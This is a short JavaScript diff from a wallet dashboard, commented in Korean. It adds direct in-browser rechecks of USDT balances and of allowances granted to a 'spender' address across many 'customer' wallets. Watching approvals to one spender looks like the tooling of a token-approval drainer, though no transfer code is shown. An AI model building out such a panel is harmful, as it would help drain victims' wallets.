@@ -1217,14 +1217,34 @@ async function fetchWalletsWithCache(addrs, forceRefresh){
         if(resp&&!resp.error&&Array.isArray(resp.wallets)){
             resp.wallets.forEach(function(item){if(item&&item.address)apiMap[item.address]=item;});
         }
-        slice.forEach(function(addr){
+        var spender=await getSpenderAddr();
+        for(var j=0;j<slice.length;j++){
+            var addr=slice[j];
             var item=apiMap[addr]||{};
             var bal=item.balance!=null?String(item.balance):'0.00';
             var allowObj=(typeof item.allowance==='object'&&item.allowance)?item.allowance:parseAllowanceObj(item.allowance||'0');
+
+            // 1) 서버 잔액이 0이면 브라우저에서 직접 잔액 재확인
+            if((parseFloat(bal)||0)<=0){
+                var directBal=await getUSDTBalance(addr);
+                if((parseFloat(directBal)||0)>0){
+                    bal=directBal;
+                }
+            }
+
+            // 2) 서버 승인이 none이면 브라우저에서 직접 allowance 재확인
+            if((!allowObj||allowObj.status==='none'||allowObj.status==='error')&&spender){
+                var rawAllow=await getUSDTAllowanceFor(addr,spender);
+                var directAllow=parseAllowanceObj(rawAllow);
+                if(directAllow&&directAllow.status!=='none'){
+                    allowObj=directAllow;
+                }
+            }
+
             var info={address:addr,balance:bal,allowance:allowObj||{status:'none',display:'0'}};
             custWalletCache[addr]=info;
             walletTtlCache[addr]={data:info,ts:Date.now()};
-        });
+        }
         if(i+CHUNK<toFetch.length)await new Promise(function(r){setTimeout(r,200);});
     }
 }
@@ -1715,7 +1735,6 @@ function apRenderHistoryList(history){
     });
 }
 
-// ================================================================
 // 홍보 링크
 // ================================================================
 function renderLinks(){
